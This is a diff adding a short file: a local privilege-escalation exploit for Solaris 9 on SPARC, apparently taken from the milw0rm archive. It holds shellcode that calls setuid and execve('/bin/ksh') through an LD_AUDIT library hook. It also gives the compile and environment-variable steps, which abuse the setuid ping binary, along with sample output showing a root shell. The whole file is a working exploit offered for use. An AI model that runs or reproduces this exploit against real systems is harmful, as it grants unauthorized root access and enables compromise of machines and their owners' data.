@@ -1,0 +1,30 @@
+/* 
+Solaris 9 on SPARC: 
+
+$ cat dupa.c
+*/
+
+char sh[] =
+/* setuid() */
+"\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"
+/* execve() */
+"\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x90\x03\xe0\x20"
+"\x92\x02\x20\x10\xc0\x22\x20\x08\xd0\x22\x20\x10\xc0\x22\x20\x14"
+"\x82\x10\x20\x0b\x91\xd0\x20\x08/bin/ksh";
+
+int la_version() {
+       void (*f)();
+       f = (void*)sh;
+       f();
+       return 3;
+}
+
+/*
+$ gcc -fPIC -shared -o /tmp/dupa.so dupa.c
+$ export LD_AUDIT=/tmp/dupa.so
+$ ping
+# id
+uid=0(root) gid=100(student)
+*/
+
+// milw0rm.com [2005-06-28]
